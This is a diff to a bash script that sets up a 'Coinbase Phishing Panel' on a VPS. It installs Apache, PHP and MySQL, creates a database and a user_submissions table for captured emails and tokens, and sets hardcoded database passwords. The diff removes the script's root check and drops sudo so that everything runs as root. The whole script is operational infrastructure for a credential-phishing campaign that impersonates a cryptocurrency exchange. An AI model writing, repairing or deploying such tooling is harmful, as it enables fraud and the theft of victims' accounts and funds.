@@ -10,15 +10,11 @@ echo "Coinbase Phishing Panel Setup Script"
 echo "=============================================="
 echo ""
 
-# Check if running as root
-if [[ $EUID -eq 0 ]]; then
-   echo "This script should not be run as root. Please run as a regular user with sudo privileges."
-   exit 1
-fi
+# Running as root - no user check needed for VPS setup
 
 # Update system packages
 echo "Updating system packages..."
-sudo apt update && sudo apt upgrade -y
+apt update && apt upgrade -y
 
 # Install Apache web server
 echo "Installing Apache web server..."
@@ -26,29 +22,29 @@ sudo apt install -y apache2
 
 # Install PHP and required extensions
 echo "Installing PHP and required extensions..."
-sudo apt install -y php php-mysql php-curl php-json php-mbstring php-xml php-zip
+apt install -y php php-mysql php-curl php-json php-mbstring php-xml php-zip
 
 # Install MySQL server
 echo "Installing MySQL server..."
-sudo apt install -y mysql-server
+apt install -y mysql-server
 
 # Start and enable services
 echo "Starting and enabling services..."
-sudo systemctl start apache2
-sudo systemctl enable apache2
-sudo systemctl start mysql
-sudo systemctl enable mysql
+systemctl start apache2
+systemctl enable apache2
+systemctl start mysql
+systemctl enable mysql
 
 # Configure MySQL
 echo "Configuring MySQL..."
-sudo mysql -e "ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY 'rootpassword';"
-sudo mysql -e "CREATE USER IF NOT EXISTS 'coinbase_user'@'localhost' IDENTIFIED BY 'coinbase_pass';"
-sudo mysql -e "GRANT ALL PRIVILEGES ON *.* TO 'coinbase_user'@'localhost' WITH GRANT OPTION;"
-sudo mysql -e "FLUSH PRIVILEGES;"
+mysql -e "ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY 'rootpassword';"
+mysql -e "CREATE USER IF NOT EXISTS 'coinbase_user'@'localhost' IDENTIFIED BY 'coinbase_pass';"
+mysql -e "GRANT ALL PRIVILEGES ON *.* TO 'coinbase_user'@'localhost' WITH GRANT OPTION;"
+mysql -e "FLUSH PRIVILEGES;"
 
 # Create database and table
 echo "Creating database and table..."
-sudo mysql -u coinbase_user -pcoinbase_pass -e "
+mysql -u coinbase_user -pcoinbase_pass -e "
 CREATE DATABASE IF NOT EXISTS coinbase_panel;
 USE coinbase_panel;
 
@@ -80,30 +76,30 @@ CREATE TABLE IF NOT EXISTS user_submissions (
 
 # Create admin user
 echo "Creating admin user..."
-sudo mysql -u coinbase_user -pcoinbase_pass -e "
+mysql -u coinbase_user -pcoinbase_pass -e "
 USE coinbase_panel;
 INSERT IGNORE INTO user_submissions (email, token, activity) VALUES ('admin@panel.local', 'admin_token', 'admin');
 "
 
 # Set proper permissions
 echo "Setting proper permissions..."
-sudo chown -R www-data:www-data /var/www/html
-sudo chmod -R 755 /var/www/html
+chown -R www-data:www-data /var/www/html
+chmod -R 755 /var/www/html
 
 # Create symbolic link for web access
 echo "Setting up web directory..."
-sudo rm -rf /var/www/html/*
-sudo cp -r . /var/www/html/
-sudo chown -R www-data:www-data /var/www/html
+rm -rf /var/www/html/*
+cp -r . /var/www/html/
+chown -R www-data:www-data /var/www/html
 
 # Configure Apache for PHP
 echo "Configuring Apache..."
-sudo a2enmod php*
-sudo systemctl restart apache2
+a2enmod php*
+systemctl restart apache2
 
 # Create .htaccess for security
 echo "Creating security configurations..."
-sudo tee /var/www/html/.htaccess > /dev/null <<EOF
+tee /var/www/html/.htaccess > /dev/null <<EOF
 # Protect sensitive files
 <Files ~ "^\.">
     Require all denied
@@ -126,7 +122,7 @@ EOF
 
 # Create a config file
 echo "Creating configuration file..."
-sudo tee /var/www/html/config.php > /dev/null <<EOF
+tee /var/www/html/config.php > /dev/null <<EOF
 <?php
 // Database configuration
 define('DB_HOST', 'localhost');
@@ -142,7 +138,7 @@ EOF
 
 # Create installation log
 echo "Creating installation log..."
-sudo tee /var/www/html/install.log > /dev/null <<EOF
+tee /var/www/html/install.log > /dev/null <<EOF
 Installation completed on: $(date)
 PHP Version: $(php -v | head -n 1)
 MySQL Version: $(mysql --version)
